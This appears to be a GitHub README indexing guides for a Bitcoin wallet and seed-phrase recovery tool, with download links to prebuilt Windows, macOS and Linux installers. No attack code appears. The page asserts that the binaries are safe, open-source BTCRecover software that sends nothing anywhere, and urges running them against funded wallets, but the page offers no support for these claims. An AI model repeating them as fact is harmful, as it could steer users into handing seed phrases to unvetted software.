<div align="center">
<img src="assets/banner-hub.png" alt="BTC Recovery tool guides and index">
</div>

<h1 align="center">BTC Recovery tool guides and index</h1>

<p align="center">The index to all forty guides, plus the tool, command line, safety and odds pages.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

## What this repository is for

This repository is the index for the whole BTC Recovery guide set, and it is also the home of the pages that are about the tool rather than about one wallet. Fourteen pages live here: what the tool does and when it works, the command line and token-list references, the first-run walkthrough, the safety and trust checks, the comparison with other approaches, the recovery-odds arithmetic, the FAQ, and the pages for a shared phrase, storage and estates. The other thirty guides are in two companion repositories, split by what the reader is holding, and the grouped list below links every one of them. Start here if you are deciding whether the tool is right for you, or if you are already running it and need the reference pages.

## Who it is for

- You are deciding whether this tool fits your situation before you install anything.
- You have run it once and need the option names, token patterns or a repeatable command line.
- You are checking the safety of a download, or comparing this approach with another.
- You need the arithmetic of a search space before committing a machine to it.

## Start here

- [btcrecover-bitcoin-wallet-recovery-tool](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-bitcoin-wallet-recovery-tool.md) is the overview: what the tool does and the cases it does not cover.
- [is-btcrecover-safe](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md) covers what to check before you run anything against a live wallet.
- [how-to-use-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/how-to-use-btcrecover.md) is the first-run walkthrough, one wallet end to end.
- [btcrecover-command-line-options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md) is the reference page to keep open while you work.

## How to use these guides

1. Read the overview page first so you know which of the tool's searches matches your situation.
2. Read the safety page before the first run against anything that holds a balance.
3. Do one first run on a wallet you do not need, using the walkthrough.
4. Keep the command-line and token-list pages open while you build the real run.
5. Use the odds page to decide how large a search is worth starting before you start it.
6. Write the command down once it works, rather than rebuilding it from memory on the next wallet.

## The guides, grouped

| Guide | What it answers |
| --- | --- |
| [Bitcoin wallet recovery tool: what it does and when it works](btcrecover-bitcoin-wallet-recovery-tool.md) | It runs offline on Windows, macOS and Linux, works on the file or phrase you already hold, and sends nothing anywhere. |
| [BTCRecover command-line options](btcrecover-command-line-options.md) | The options exist to pin those down, and the built-in help lists every flag with its current spelling. |
| [Token lists and password patterns](btcrecover-token-list-reference.md) | A token list turns a vague memory into a searchable space. Instead of guessing one password at a time, you describe the words you might have used. |
| [Is BTCRecover safe, and how to check a download](is-btcrecover-safe.md) | BTCRecover is free, open-source software that runs offline and needs nothing sent anywhere, which makes it safe in the way that matters for a recovery tool. |
| [You shared your seed phrase: what is recoverable](btcrecover-shared-seed-phrase.md) | No tool recovers stolen coins; the recoverable part is whatever has not been taken yet, and the clock is the whole problem. |
| [Seed phrase storage and the USB-drive question](seed-phrase-storage-btcrecover.md) | A seed phrase should be stored offline, on a durable medium, in two separate places, and tested by restoring it once. |
| [Checking many wallet files against one password list](btcrecover-multiple-wallets-one-run.md) | The arrangement is simple, and it is the difference between testing a list once against your whole archive and doing it by hand twenty times. |
| [How the recovery odds calculator works](btcrecover-seed-recovery-calculator.md) | The calculator does that division; whether the answer is minutes or centuries depends on how much you know. |
| [GPU acceleration setup](btcrecover-gpu-acceleration-setup.md) | A graphics card tests candidates far faster than a processor, which matters when the search space is large and nothing else can be narrowed. |
| [BTCRecover compared with Seed Savior and Hashcat](btcrecover-vs-seed-savior.md) | Three tools come up most often for wallet recovery, and they are not interchangeable: BTCRecover works on wallet files and seed phrases. |
| [How to use BTCRecover: first run walkthrough](how-to-use-btcrecover.md) | Get those right and the command is short; get one wrong and the run is silent, which is the part that costs people a weekend. |
| [Wallet recovery FAQ](btcrecover-wallet-recovery-faq.md) | The questions that come up before anything else: what can be recovered, what cannot, which artifact decides it, and where each route starts. |
| [Recovery odds, search space and time](btcrecover-recovery-odds-and-time.md) | Most recoveries either finish in an hour or do not finish at all, and knowing which kind you are in is worth more than any speed-up. |
| [Crypto estate and inheritance wallet recovery](crypto-estate-wallet-recovery-btcrecover.md) | Recovering a wallet for an estate is the same technical work as recovering your own, with two differences. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| Deciding whether the tool applies | [Bitcoin wallet recovery tool: what it does and when it works](btcrecover-bitcoin-wallet-recovery-tool.md) | The supported cases and the boundary, before an install. |
| A run you need to repeat | [BTCRecover command-line options](btcrecover-command-line-options.md) | The exact options, written once and reused. |
| Password guesses that follow a pattern | [Token lists and password patterns](btcrecover-token-list-reference.md) | Candidate patterns built from fragments instead of a word list. |
| A machine you are about to leave running | [Recovery odds, search space and time](btcrecover-recovery-odds-and-time.md) | The size of the search, in arithmetic you can check. |
| A download you are not sure about | [Is BTCRecover safe, and how to check a download](is-btcrecover-safe.md) | The checks that establish the file is the published one. |
| A phrase that was shared or stored badly | [You shared your seed phrase: what is recoverable](btcrecover-shared-seed-phrase.md) | What is recoverable after a phrase has been exposed, and the order to act in. |

## Common first questions

### Is the tool free?

Yes. It is published under the GPL-2.0 licence, with the source available on this account and no paid tier.

### Does it need a GPU?

No, though it can use one. The GPU page covers the setup and what it changes about a long run.

### Can I run it on several wallet files at once?

Yes, and there is a page for the command that does it, which is the reason that page exists.

### What happens if a run finds nothing?

That is usually a wrong input rather than a hopeless wallet. The failed-run page lists the four inputs to re-check, in order.

### Do I need to read all forty guides?

No. Read the overview, the safety page and the one guide that matches what you are holding. The rest are reference pages for the run itself.

## Before you install

Install the current release from the application repository, and read the safety page before the first run against a wallet that holds anything. This repository is the reference half of the set: the command line, the token patterns, the odds and the boundary of what the tool targets. Keep the walkthrough open for a first run and the reference pages open once you are building a real one, because the option names in the guides are the ones the application prints. The reference pages here are meant to be open beside the terminal; reading them once and closing them is how a run ends up with an option name typed from memory.

## About

This repository is the index and the reference shelf: the fourteen pages that are about the tool rather than about one kind of wallet. It links every guide in the other two repositories, so a reader who lands here first can find the page for their situation without knowing how the set is arranged. The application repository publishes the release, the seed-phrase and wallet-file repositories carry the thirty situation guides, and the profile page is the short version of all of it. References here are written to be used beside a running search, which is why the command line, the token patterns and the odds pages are grouped together. Everything here is written against the published release rather than an older tag, so an option named in a page exists in the build the reader installed.

## License

This repository is released under the GPL-2.0 licence, and the full text is in [LICENSE](LICENSE).

---

**BTC Recovery** - offline Bitcoin wallet recovery for Windows, macOS and Linux.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).

## The other two repositories

- [BTC Recovery seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) carries 13 guides: how to recover a seed phrase, how to recover a bitcoin wallet with a seed phrase, recover a seed phrase with 1-3 missing words, seed words in the wrong order and more.
- [BTC Recovery wallet file and password guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) carries 13 guides: bitcoin wallet password recovery tool, wallet.dat password recovery for bitcoin core, electrum wallet password and seed recovery, metamask vault password recovery and more.

